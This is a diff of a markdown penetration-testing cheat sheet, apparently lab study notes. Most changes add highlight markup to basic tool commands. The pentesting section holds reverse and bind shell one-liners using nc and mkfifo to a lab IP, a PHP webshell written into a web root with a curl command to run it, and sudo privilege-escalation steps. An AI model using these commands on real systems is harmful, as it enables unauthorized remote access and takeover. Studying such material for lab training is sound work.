@@ -2,36 +2,36 @@
 
 ### Basic Tools
 
-| **Command**                                                | **Description**                      |
-| ---------------------------------------------------------- | ------------------------------------ |
-| **General**                                                |                                      |
-| <mark style="color:green;">`sudo openvpn user.ovpn`</mark> | Connect to VPN                       |
-| `ifconfig`/`ip a`                                          | Show our IP address                  |
-| `netstat -rn`                                              | Show networks accessible via the VPN |
-| `ssh user@10.10.10.10`                                     | SSH to a remote server               |
-| `ftp 10.129.42.253`                                        | FTP to a remote server               |
-| **tmux**                                                   |                                      |
-| `tmux`                                                     | Start tmux                           |
-| `ctrl+b ctrl+c`                                            | tmux: new window                     |
-| `ctrl+b 1`                                                 | tmux: switch to window (`1`)         |
-| `ctrl+%`                                                   | tmux: split pane vertically          |
-| `ctrl+"`                                                   | tmux: split pane horizontally        |
-| `ctrl+->`                                                  | tmux: switch to the right pane       |
-| **Vim**                                                    |                                      |
-| `vim file`                                                 | vim: open `file` with vim            |
-| `esc+i`                                                    | vim: enter `insert` mode             |
-| `esc`                                                      | vim: back to `normal` mode           |
-| `x`                                                        | vim: Cut character                   |
-| `dw`                                                       | vim: Cut word                        |
-| `dd`                                                       | vim: Cut full line                   |
-| `yw`                                                       | vim: Copy word                       |
-| `yy`                                                       | vim: Copy full line                  |
-| `p`                                                        | vim: Paste                           |
-| `:1`                                                       | vim: Go to line number 1.            |
-| `:w`                                                       | vim: Write the file 'i.e. save'      |
-| `:q`                                                       | vim: Quit                            |
-| `:q!`                                                      | vim: Quit without saving             |
-| `:wq`                                                      | vim: Write and quit                  |
+| **Command**                                                                                                             | **Description**                                                                                                                   |
+| ----------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------- |
+| **General**                                                                                                             |                                                                                                                                   |
+| <mark style="color:green;">`sudo openvpn user.ovpn`</mark>                                                              | Connect to VPN                                                                                                                    |
+| <mark style="color:green;">`ifconfig`</mark><mark style="color:green;">/</mark><mark style="color:green;">`ip a`</mark> | Show our IP address                                                                                                               |
+| <mark style="color:green;">`netstat -rn`</mark>                                                                         | Show networks accessible via the VPN                                                                                              |
+| <mark style="color:green;">`ssh user@10.10.10.10`</mark>                                                                | SSH to a remote server                                                                                                            |
+| <mark style="color:green;">`ftp 10.129.42.253`</mark>                                                                   | FTP to a remote server                                                                                                            |
+| **tmux**                                                                                                                |                                                                                                                                   |
+| <mark style="color:green;">`tmux`</mark>                                                                                | Start tmux                                                                                                                        |
+| <mark style="color:green;">`ctrl+b ctrl+c`</mark>                                                                       | tmux: new window                                                                                                                  |
+| <mark style="color:green;">`ctrl+b 1`</mark>                                                                            | tmux: switch to window (<mark style="color:green;">`1`</mark>)                                                                    |
+| <mark style="color:green;">`ctrl+%`</mark>                                                                              | tmux: split pane vertically                                                                                                       |
+| <mark style="color:green;">`ctrl+"`</mark>                                                                              | tmux: split pane horizontally                                                                                                     |
+| <mark style="color:green;">`ctrl+->`</mark>                                                                             | tmux: switch to the right pane                                                                                                    |
+| **Vim**                                                                                                                 |                                                                                                                                   |
+| <mark style="color:green;">`vim file`</mark>                                                                            | vim: open <mark style="color:green;">`file`</mark> <mark style="color:green;"></mark><mark style="color:green;"></mark> with vim  |
+| `esc+i`                                                                                                                 | vim: enter <mark style="color:green;">`insert`</mark> <mark style="color:green;"></mark><mark style="color:green;"></mark> mode   |
+| `esc`                                                                                                                   | vim: back to <mark style="color:green;">`normal`</mark> <mark style="color:green;"></mark><mark style="color:green;"></mark> mode |
+| `x`                                                                                                                     | vim: Cut character                                                                                                                |
+| `dw`                                                                                                                    | vim: Cut word                                                                                                                     |
+| `dd`                                                                                                                    | vim: Cut full line                                                                                                                |
+| `yw`                                                                                                                    | vim: Copy word                                                                                                                    |
+| `yy`                                                                                                                    | vim: Copy full line                                                                                                               |
+| `p`                                                                                                                     | vim: Paste                                                                                                                        |
+| `:1`                                                                                                                    | vim: Go to line number 1.                                                                                                         |
+| <mark style="color:green;">`:w`</mark>                                                                                  | vim: Write the file 'i.e. save'                                                                                                   |
+| <mark style="color:green;">`:q`</mark>                                                                                  | vim: Quit                                                                                                                         |
+| `:q!`                                                                                                                   | vim: Quit without saving                                                                                                          |
+| <mark style="color:green;">`:wq`</mark>                                                                                 | vim: Write and quit                                                                                                               |
 
 ### Pentesting
 
@@ -69,14 +69,14 @@
 | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f`                               | Another command to send a reverse shell from the remote server        |
 | `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f`                                    | Start a bind shell on the remote server                               |
 | `nc 10.10.10.1 1234`                                                                                             | Connect to a bind shell started on the remote server                  |
-| `python -c 'import pty; pty.spawn("/bin/bash")'`                                                                 | Upgrade shell TTY (1)                                                 |
+| <mark style="color:green;">`python -c 'import pty; pty.spawn("/bin/bash")'`</mark>                               | Upgrade shell TTY (1)                                                 |
 | `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice                                                      | Upgrade shell TTY (2)                                                 |
-| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`                                                | Create a webshell php file                                            |
-| `curl http://SERVER_IP:PORT/shell.php?cmd=id`                                                                    | Execute a command on an uploaded webshell                             |
+| <mark style="color:green;">`echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`</mark>              | Create a webshell php file                                            |
+| <mark style="color:green;">`curl http://SERVER_IP:PORT/shell.php?cmd=id`</mark>                                  | Execute a command on an uploaded webshell                             |
 | **Privilege Escalation**                                                                                         |                                                                       |
-| `./linpeas.sh`                                                                                                   | Run `linpeas` script to enumerate remote server                       |
+| <mark style="color:green;">`./linpeas.sh`</mark>                                                                 | Run `linpeas` script to enumerate remote server                       |
 | `sudo -l`                                                                                                        | List available `sudo` privileges                                      |
-| `sudo -u user /bin/echo Hello World!`                                                                            | Run a command with `sudo`                                             |
+| <mark style="color:green;">`sudo -u user /bin/echo Hello World!`</mark>                                          | Run a command with `sudo`                                             |
 | `sudo su -`                                                                                                      | Switch to root user (if we have access to `sudo su`)                  |
 | `sudo su user -`                                                                                                 | Switch to a user (if we have access to `sudo su`)                     |
 | `ssh-keygen -f key`                                                                                              | Create a new SSH key                                                  |
